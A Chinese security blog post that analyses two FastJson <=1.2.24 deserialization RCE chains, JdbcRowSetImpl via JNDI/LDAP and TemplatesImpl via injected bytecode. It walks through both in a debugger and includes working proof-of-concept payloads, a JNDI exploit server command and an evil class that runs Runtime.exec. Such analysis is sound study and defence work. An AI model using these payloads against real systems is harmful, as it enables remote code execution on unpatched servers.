> 原文链接: https://www.anquanke.com//post/id/223467 


# FastJson&lt;=1.2.24RCE双链详细分析


                                阅读量   
                                **118633**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t0175552f2250560322.jpg)](https://p2.ssl.qhimg.com/t0175552f2250560322.jpg)



## 0x00 前言

最近在学习FastJson，阿里这个开源的JSON解析库，了解到他被频繁爆出漏洞，于是我做了详细的fastjson漏洞史分析。本文只涉及&lt;1.2.25版本的RCE的两种利用方式，后续会补充其他漏洞。



## 0x01 FastJson简单使用

序列化是把java对象转为json字符串，反序列化即为把json字符串转为java对象，这样就方便进行传输或者存储。之前有人对比过java序列化、fastjson和jackson等序列化反序列化的速度，fastjson快的同时也带来一些安全问题。写一个简单的例子演示一下反序列化的使用。

```
//fastjson.java

package test;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

public class fastjson `{`
    public static void main(String args[])`{`
        String obj = "`{`\"@type\":\"test.Student\",\"name\":\"zzZ\",\"age\":111`}`";
        Student obj1 = JSON.parseObject(obj, Student.class, Feature.SupportNonPublicField);
        System.out.println("name:"+obj1.getName()+"\nage:"+obj1.getAge());
    `}`
`}`


---
-输-出-
name:zzZ
age:111
```

```
//Student.java

package test;

public class Student `{`
    public String name;
    private int age;

    public String getName() `{`
        return name;
    `}`
    public void setName(String name) `{`
        this.name = name;
    `}`
    public int getAge() `{`
        return age;
    `}`
    public void setAge(int age) `{`
        this.age = age;
    `}`
`}`
```



## 0x02 漏洞由来

fastjson的漏洞主要都是因为AutoType造成的，后续的修复和其他版本的绕过都围绕此来进行。

fastjson在进行序列化时会扫描目标的get方法，并将字段的值序列化到JSON字符串中。而当一个类中包含了一个接口（或抽象类）的时，在使用fastjson进行序列化的时候，会将其子类型抹去，只保留接口（或抽象类）的类型，这就导致及逆行反序列化时无法得到原始的类型。为了解决这个问题，fastjson在JSON字符串中添加了[@type](https://github.com/type)标识（AutoType功能），标注了类对应的原始类型，也就可以在反序列化的时候可以找到具体类型。

在1.2.25之前，AutoType是默认开启，而且没有任何防护，我们只需要传入一个恶意类，配合java反射机制和rmi或者ldap服务就可以实现RCE。在1.2.25中修复，添加了checkAutotype，被绕过后又不断丰富黑白名单直到今天。我们详细一点点分析。



## 0x03 两条调用链分析

### <a class="reference-link" name="%E5%88%A9%E7%94%A8JdbcRowSetImpl%E7%B1%BB%E8%BF%9B%E8%A1%8CRCE"></a>利用JdbcRowSetImpl类进行RCE

<a class="reference-link" name="%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"></a>**一、环境搭建**

使用IDEA和JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar（用来搭建rmi和ldap服务）。
- 新建maven项目后添加1.2.23版本fastjson的依赖，之后添加com.fj.learnFJ.java。
```
package com.fj;

import com.alibaba.fastjson.JSON;

public class learnFJ `{`
        public static void main(String args[])`{`
                String payload = "`{`\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\"," +
                        " \"autoCommit\":true`}`";
                JSON.parse(payload);
        `}`
`}`
```
- 使用JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar搭建服务。
```
java -jar .\JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C calc -A 127.0.0.1
```

[![](https://p2.ssl.qhimg.com/t014352a7f5034ad62d.png)](https://p2.ssl.qhimg.com/t014352a7f5034ad62d.png)

<a class="reference-link" name="%E4%BA%8C%E3%80%81%E8%B0%83%E7%94%A8%E5%88%86%E6%9E%90"></a>**二、调用分析**

首先在JSON.parse(payload)下断点后运行

[![](https://p3.ssl.qhimg.com/t0136d86ddbcca27c15.png)](https://p3.ssl.qhimg.com/t0136d86ddbcca27c15.png)

跟进后调用parse.parse来解析

[![](https://p0.ssl.qhimg.com/t01dc4a6d34101b0a10.png)](https://p0.ssl.qhimg.com/t01dc4a6d34101b0a10.png)

因为是左大括号`{`，所以跳转到case LBRACE执行，并在1327行调用parseObject()反序列化

[![](https://p2.ssl.qhimg.com/t01298c6259b37d2b6d.png)](https://p2.ssl.qhimg.com/t01298c6259b37d2b6d.png)

进入获取内容的for循环，并获得payload中第一个字符’”‘

[![](https://p0.ssl.qhimg.com/t014afc7c24044fd48b.png)](https://p0.ssl.qhimg.com/t014afc7c24044fd48b.png)

获取引号后，获取其内容[@type](https://github.com/type)

[![](https://p4.ssl.qhimg.com/t0175bf81b72a245cf5.png)](https://p4.ssl.qhimg.com/t0175bf81b72a245cf5.png)

之后进行第二个值的获取，得到类名

[![](https://p3.ssl.qhimg.com/t015f9e97de6258e00f.png)](https://p3.ssl.qhimg.com/t015f9e97de6258e00f.png)

将调用deserializer.deserialze函数来处理反序列化数据，此时deserializer中已经包含了要实例化的类

[![](https://p1.ssl.qhimg.com/t01d3b0a13bc2facbbd.png)](https://p1.ssl.qhimg.com/t01d3b0a13bc2facbbd.png)

之后fastjson会在内部处理jdbcrowsetimpl类。我们在JdbcRowSetImpl类setDataSourceName()处下断点，因为传入了DataSourceName，所以会进行调用

[![](https://p0.ssl.qhimg.com/t015c42d054c624cfdb.png)](https://p0.ssl.qhimg.com/t015c42d054c624cfdb.png)

之后调用抽象父类BaseRowSet的setDataSourceName给dataSource赋值

[![](https://p5.ssl.qhimg.com/t013c9d1669fbf51d14.png)](https://p5.ssl.qhimg.com/t013c9d1669fbf51d14.png)

之后会调用setAutoCommit()，其中调用了connect()，跟进

[![](https://p0.ssl.qhimg.com/t014ae41224a45499fc.png)](https://p0.ssl.qhimg.com/t014ae41224a45499fc.png)

connect()中调用了look()，这里的getDataSourceName()就是我们传入的dataSourceName，跟进look看看

[![](https://p2.ssl.qhimg.com/t011bd9b96940d0db0e.png)](https://p2.ssl.qhimg.com/t011bd9b96940d0db0e.png)

调用了getURLOrDefaultInitCtx(name).lookup()，跟进

[![](https://p5.ssl.qhimg.com/t011372ab9b3d7d7562.png)](https://p5.ssl.qhimg.com/t011372ab9b3d7d7562.png)

在getURLOrDefaultInitCtx()内，调用getURLContext()请求ldap服务

[![](https://p0.ssl.qhimg.com/t01016a8b868e536ed2.png)](https://p0.ssl.qhimg.com/t01016a8b868e536ed2.png)

之后通过getURLObject()从远程的ldap服务获取Context对象

[![](https://p1.ssl.qhimg.com/t0120eeca751a724cda.png)](https://p1.ssl.qhimg.com/t0120eeca751a724cda.png)

在getURLObject()内调用factory.getObjectInstance()，完成反序列化，调用了payload

[![](https://p4.ssl.qhimg.com/t01734580b0b68b6feb.png)](https://p4.ssl.qhimg.com/t01734580b0b68b6feb.png)

完整调用链：

[![](https://p5.ssl.qhimg.com/t015473989064d2b443.png)](https://p5.ssl.qhimg.com/t015473989064d2b443.png)

### <a class="reference-link" name="%E5%88%A9%E7%94%A8TemplatesImpl%E7%B1%BB%E8%BF%9B%E8%A1%8CRCE"></a>利用TemplatesImpl类进行RCE

<a class="reference-link" name="%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"></a>**一、环境搭建**

我们使用IDEA搭建即可。
- 添加maven依赖后，添加Poc.java
```
//Poc.java

package com.fj;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.maven.surefire.shade.booter.org.apache.commons.io.IOUtils;
import org.apache.commons.codec.binary.Base64;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class Poc `{`
    public static String readClass(String cls)`{`
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try `{`
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        `}` catch (IOException e) `{`
            e.printStackTrace();
        `}`

        String result = Base64.encodeBase64String(bos.toByteArray());

        return result;
    `}`

    public static void poc() `{`
        ParserConfig config = new ParserConfig();
        final String fileSeparator = System.getProperty("file.separator");
        String path = "C:\\Users\\xxx\\Desktop\\code\\evil.class";
        String code = readClass(path);

        final String CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";

        String text1 = "`{`\"@type\":\"" + CLASS +
                "\",\"_bytecodes\":[\""+code+"\"]," +
                "'_name':'a.b'," +
                "'_tfactory':`{` `}`," +
                "\"_outputProperties\":`{` `}``}`\n";
        System.out.println(text1);
        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
    `}`

    public static void main(String args[]) `{`
        poc();
    `}`
`}`
```
- 添加evil.java，并用javac编译为evil.class。
```
//evil.java

package com.fj;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;

public class evil extends AbstractTranslet`{`
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) `{`
    `}`
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException `{`
    `}`
    public evil() throws IOException `{`
        Runtime.getRuntime().exec("calc");
    `}`
    public static void main(String[] args) throws IOException `{`
        evil obj = new evil();
    `}`
`}`
```

运行后弹出计算器。

[![](https://p0.ssl.qhimg.com/t011fbe4e3308709670.png)](https://p0.ssl.qhimg.com/t011fbe4e3308709670.png)

<a class="reference-link" name="%E4%BA%8C%E3%80%81%E8%B0%83%E7%94%A8%E5%88%86%E6%9E%90"></a>**二、调用分析**

对于TemplatesImpl的payload，在高版本java中要开启Feature.SupportNonPublicField才能对非共有属性的反序列化处理，因此存在一定限制，而之前第一种方法中JdbcRowSetImpl利用几乎无限制。接下来简单分析下TemplatesImpl链的调用。

在parseObject()下断点后调式

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t013faf0cf05db072ad.png)

跟第一种一样进入deserializer.deserialze() 进行反序列化

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t019dc32dd92f95c4df.png)

之后进入parseField()对json字符串中的一些key值进行匹配

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01a427436157f7e8b4.png)

在parseField()中调用smartMatch()对key值进行处理

[![](https://p4.ssl.qhimg.com/t01063e31d4cc3270a9.png)](https://p4.ssl.qhimg.com/t01063e31d4cc3270a9.png)

之后进入fieldDeserializer.parseField()

[![](https://p4.ssl.qhimg.com/t010b1841999423adb2.png)](https://p4.ssl.qhimg.com/t010b1841999423adb2.png)

在fieldDeserializer.parseField()中调用了setValue()，跟进

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0133e69232b5329c62.png)

setValue()中method内方法为getOutputProperties()，并在后面通过反射机制调用，进入TemplatesImpl类

[![](https://p1.ssl.qhimg.com/t0130a511156e3a8bfa.png)](https://p1.ssl.qhimg.com/t0130a511156e3a8bfa.png)

[![](https://p5.ssl.qhimg.com/t010e6194c55ab75d8a.png)](https://p5.ssl.qhimg.com/t010e6194c55ab75d8a.png)

getOutputProperties()内调用newTransformer()会创建Transformer实例，我们跟进

[![](https://p2.ssl.qhimg.com/t0138f9c4dcfcf4e0f1.png)](https://p2.ssl.qhimg.com/t0138f9c4dcfcf4e0f1.png)

在内部会调用getTransletInstance()创建实例之后返回给上层函数，我们跟进

[![](https://p3.ssl.qhimg.com/t01dd4713b7e5a9c491.png)](https://p3.ssl.qhimg.com/t01dd4713b7e5a9c491.png)

在getTransletInstance()内，调用defineTransletClasses()遍历_bytecodes数组（判断是byte[]数组会自动base64解码，所以poc里需要进行base64编码），之后调用(AbstractTranslet) _class[_transletIndex].newInstance()实例化类，类定义的是静态方法，执行触发payload

[![](https://p2.ssl.qhimg.com/t01f1841345d813e9c1.png)](https://p2.ssl.qhimg.com/t01f1841345d813e9c1.png)

整个过程调用链为：

[![](https://p4.ssl.qhimg.com/t01335cc81a3009b642.png)](https://p4.ssl.qhimg.com/t01335cc81a3009b642.png)



## 0x04 结语

上面详细跟踪了两条链的利用方式，相信对于 &lt;1.2.25漏洞的利用已经非常清楚了。<br>
这次的漏洞修复方式是默认关闭AutoType的支持，添加了checkAutotype来判断是否符合要求，并添加了白名单和黑名单来防护AutoType是开启的情况。在之后又出现了各种绕过的姿势，下篇文章继续分析。
